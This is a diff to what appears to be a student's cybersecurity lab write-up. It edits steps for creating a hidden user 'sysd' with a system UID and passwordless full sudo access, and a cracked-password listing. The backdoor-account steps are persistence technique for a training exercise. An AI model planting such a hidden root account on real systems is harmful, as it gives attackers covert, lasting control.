@@ -20,19 +20,19 @@ You will not need the above steps as part of your submission file.
 ---
 ### Step 1: Shadow People
 1. Create a secret user named `sysd`. Make sure this user doesn't have a home folder created:
-    - `sudo useradd sysd`
+    - `useradd sysd`
 
 2. Give your secret user a password:
-    - `sudo passwd sysd`
+    - `passwd sysd`
 
 3. Give your secret user a system UID < 1000:
-    - `sudo usermod -u 400 sysd`
+    - `usermod -u 400 sysd`
  
 4. Give your secret user the same GID:
-    - `sudo groupmod -g 400 sysd`
+    - `groupmod -g 400 sysd`
 
 5. Give your secret user full `sudo` access without the need for a password:
-    - `sudo visudo`
+    - `visudo`
 
     - Add the line: `sysd ALL=(ALL:ALL) NOPASSWD:ALL` under the `root` entry:
 
@@ -109,7 +109,7 @@ You will not need the above steps as part of your submission file.
     Press 'q' or Ctrl-C to abort, almost any other key for status
     computer         (stallman)
     freedom          (babbage)
-    trustno1         (mitnik)
+    trustno1         (mitnick)
     dragon           (lovelace)
     lakers           (turing)
     passw0rd         (sysadmin)
